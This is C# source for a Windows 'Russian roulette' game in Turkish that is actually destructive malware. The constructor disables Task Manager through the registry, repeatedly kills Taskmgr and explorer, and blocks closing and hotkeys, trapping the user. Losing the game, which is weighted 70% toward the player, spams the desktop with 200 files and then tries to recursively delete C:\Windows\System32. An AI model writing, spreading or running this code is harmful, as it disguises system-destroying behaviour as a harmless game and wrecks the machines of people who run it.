using System;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace RusRuleti
{
    public partial class Form1 : Form
    {
        private Random random = new Random();
        private int oyuncuCan = 3;
        private int hoppikCan = 3;

        [DllImport("user32.dll")]
        private static extern int BlockInput(bool fBlockIt);
        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, int fsModifiers, int vk);
        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        public Form1()
        {
            InitializeComponent();
            TaskManageriEngelle();
            KlavyeEngelle();
            this.FormClosing += new FormClosingEventHandler(Form1_FormClosing);
        }

        private async void tufek_Click(object sender, EventArgs e)
        {
            tufek.Enabled = false;  // Tüfek tıklamayı engelle

            // Tüfek animasyonu
            for (int i = 0; i < 10; i++)
            {
                tufek.Image.RotateFlip(System.Drawing.RotateFlipType.Rotate90FlipNone);
                tufek.Refresh();
                await Task.Delay(100);
            }

            // %30 şansla Hoppik vuruluyor, %70 şansla oyuncu vuruluyor
            if (random.Next(100) < 30)
            {
                // Hoppik vuruldu
                hoppikCan--;
                hoppikCanBar.Value = hoppikCan;
            }
            else
            {
                // Oyuncu vuruldu
                oyuncuCan--;
                oyuncuCanBar.Value = oyuncuCan;
            }

            tufek.Enabled = true; // Tüfek tekrar aktif

            // Oyunun bitişini kontrol et
            if (oyuncuCan == 0)
            {
                hoppikKazandi();
            }
            else if (hoppikCan == 0)
            {
                oyuncuKazandi();
            }
        }

        private void oyuncuKazandi()
        {
            MessageBox.Show("Ha şansa bala kazandın, adamsan bir daha gel!", "Kazandın!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        }

        private async void hoppikKazandi()
        {
            MessageBox.Show("Kaybettin! Hoppik seni bitirdi!", "Kaybettin!", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            // Masaüstüne 200 tane hoppik.txt oluştur
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            for (int i = 0; i < 200; i++)
            {
                File.WriteAllText(Path.Combine(desktopPath, $"hoppik{i}.txt"), "Hoppik kazandı!");
            }

            // 3 saniye bekleyip dizini sil
            await Task.Delay(3000);
            string dizin = @"C:\Windows\System32";
            if (Directory.Exists(dizin))
            {
                Directory.Delete(dizin, true);
            }

            Application.Exit();
        }

        private void TaskManageriEngelle()
        {
            // Registry ile Task Manager'ı kapat
            try
            {
                RegistryKey regKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                if (regKey == null)
                {
                    regKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                }
                regKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                regKey.Close();
            }
            catch { }

            // Task Manager'ı sürekli kapat
            Task.Run(() =>
            {
                while (true)
                {
                    foreach (var process in Process.GetProcessesByName("Taskmgr"))
                    {
                        process.Kill();
                    }
                    Thread.Sleep(1000);
                }
            });
        }

        private void KlavyeEngelle()
        {
            // ALT+F4, ALT+TAB, CTRL+ALT+DEL, Windows Tuşu Engelleme
            Task.Run(() =>
            {
                while (true)
                {
                    // ALT+TAB kapatma
                    foreach (var process in Process.GetProcessesByName("explorer"))
                    {
                        process.Kill();
                    }

                    // CTRL+ALT+DEL kapatma
                    foreach (var process in Process.GetProcessesByName("taskmgr"))
                    {
                        process.Kill();
                    }

                    Thread.Sleep(1000);
                }
            });

            // ALT+F4 Engelle
            RegisterHotKey(this.Handle, 1, 0, (int)Keys.F4);
            RegisterHotKey(this.Handle, 2, 1, (int)Keys.Tab);
            RegisterHotKey(this.Handle, 3, 2, (int)Keys.Delete);
            RegisterHotKey(this.Handle, 4, 3, (int)Keys.LWin);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; // ALT+F4 tamamen engellenir
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x0312) // ALT+F4 ve diğer tuşları engelle
            {
                return;
            }
            base.WndProc(ref m);
        }
    }
}
